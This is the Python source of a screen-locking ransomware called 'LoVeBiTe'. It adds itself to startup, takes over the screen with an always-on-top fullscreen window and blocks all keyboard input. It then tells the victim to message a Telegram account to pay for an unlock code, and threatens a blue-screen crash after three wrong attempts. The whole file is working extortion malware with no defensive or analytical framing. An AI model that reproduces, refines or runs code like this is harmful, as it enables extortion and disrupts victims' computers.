#! /usr/bin python
# -*- coding: utf-8 -*-

from tkinter import *
import tkinter
import time
from tkinter import messagebox
from functools import partial
from modules import bsod, startup, uninstall
import os
import keyboard
import sys

wind = Tk()
password = "404080"
lock_text = " ٩( ᗒᗨᗕ )۶ LoVeBiTe ٩( ᗒᗨᗕ )۶ "
count = 3

file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])

startup(file_path)

def buton(arg):
    enter_pass.insert(END, arg)
def delbuton():
    enter_pass.delete(-1, END)

def tapp(key):
    pass

def check():
    global count
    if enter_pass.get() == password:
        messagebox.showinfo("We Will Meet Again","UNLOCKED SUCCESSFULLY")

        uninstall(wind)
    else:
        count -= 1
        if count == 0:
            messagebox.showwarning("Death Has Arrived","number of attempts expired")
            bsod()
        else:
            messagebox.showwarning("Dont TRY","Wrong password. Avalible tries: "+ str(count))

def exiting():
    messagebox.showwarning("LoVeBiTe","DEATH IS INEVITABLE")
wind.title(" ٩( ᗒᗨᗕ )۶ LoVeBiTe ٩( ᗒᗨᗕ )۶ ")
wind["bg"] = "black"
UNTEXD = Label(wind,bg="black", fg="green", padx=10, pady=10, text="\nLoVeBiTe created by z3n13n. \n\n\n", font="helvetica 40").pack()
untex = Label(wind,bg="black", fg="green",text=lock_text, font="helvetica 40")
untex.place(x=210, y=170)
heading = 'Announcement'
announcement = Label(wind, bg='black', fg='green', font='helvetica 25 bold', text=heading).place(x=50, y=290)

note = '''YOUR DEVICE HAS BEEN LOCKED
BY LoVeBiTe
PAY AND FREE YOUR DEVICE
'''
T = Text(wind, height=7, width=35, fg='green', bd=0, exportselection=0, bg='black', font='helvetica 19')
T.place(x=50, y=340)
T.insert(INSERT, note)

procedure = 'HOW TO UNLOCK YOUR DEVICE'
procedure = Label(wind, bg='black', fg='green', font='helvetica 25 bold', text=procedure).place(x=50, y=530)
steps = '''1. GO TO telegram 
2. MSG @n3tw0rkh4x0r for
    password
3. USE THE CODE HERE '''
T1 = Text(wind, height=5, width=30, fg='green', bd=0, exportselection=0, bg='black', font='helvetica 19')
T1.place(x=50, y=580)
T1.insert(INSERT, steps)

keyboard.on_press(tapp, suppress=True)

vertical = Frame(wind, bg='green', height=490, width=2)
vertical.pack() #place(x=520, y=310)


enter_pass = Entry(wind, bg="black", bd=30, fg="green", text="", show='•', font="helvetica 35", width=11, insertwidth=4, justify="center")
enter_pass.place(x=715, y=290)     #pack
wind.resizable(0,0)


wind.lift()
wind.attributes('-topmost',True)

wind.after_idle(wind.attributes,'-topmost',True)
wind.attributes('-fullscreen', True)
wind.protocol("WM_DELETE_WINDOW", exiting)

left_value = 20
moving_value = 80

button1 = Button(wind, text="1", bg='#00FF00', fg='#000000', bd=5, height=2, width=7, font=('Helvetica 16'), command=partial(buton, "1")).place(x=640 + moving_value, y=450)
button2 = Button(wind, text="2", bg='#00FF00', fg='#000000', bd=5, height=2, width=7, font=('Helvetica 16'), command=partial(buton, "2")).place(x=790 + 50, y=450)
button3 = Button(wind, text="3", bg='#00FF00', fg='#000000', bd=5, height=2, width=7, font=('Helvetica 16'), command=partial(buton, "3")).place(x=940 + left_value, y=450)
button4 = Button(wind, text="4", bg='#00FF00', fg='#000000', bd=5, height=2, width=7, font=('Helvetica 16'), command=partial(buton, "4")).place(x=640 + moving_value, y=540)
button5 = Button(wind, text="5", bg='#00FF00', fg='#000000', bd=5, height=2, width=7, font=('Helvetica 16'), command=partial(buton, "5")).place(x=790 + 50, y=540)
button6 = Button(wind, text="6", bg='#00FF00', fg='#000000', bd=5, height=2, width=7, font=('Helvetica 16'), command=partial(buton, "6")).place(x=940 + left_value, y=540)
button7 = Button(wind, text="7", bg='#00FF00', fg='#000000', bd=5, height=2, width=7, font=('Helvetica 16'), command=partial(buton, "7")).place(x=760 + moving_value, y=630)
button8 = Button(wind, text="8", bg='#00FF00', fg='#000000', bd=5, height=2, width=7, font=('Helvetica 16'), command=partial(buton, "8")).place(x=670 + 50, y=630)
button9 = Button(wind, text="9", bg='#00FF00', fg='#000000', bd=5, height=2, width=7, font=('Helvetica 16'), command=partial(buton, "9")).place(x=940 + left_value, y=630)
button0 = Button(wind, text="0", bg='#00FF00', fg='#000000', bd=5, height=2, width=7, font=('Helvetica 16'), command=partial(buton, "0")).place(x=790 + 50, y=720)
delbutton = Button(wind, text="Delete", bg='#00FF00', fg='#000000', bd=5, height=2, width=7, font=('Helvetica 16'), command=delbuton).place(x=640 + moving_value, y=720)
button = Button(wind, text="Unlock", bg='#00FF00', fg='#000000', bd=5, height=2, width=7, font=('Helvetica 16'), command=check).place(x=940 + left_value, y=720)

wind.mainloop()
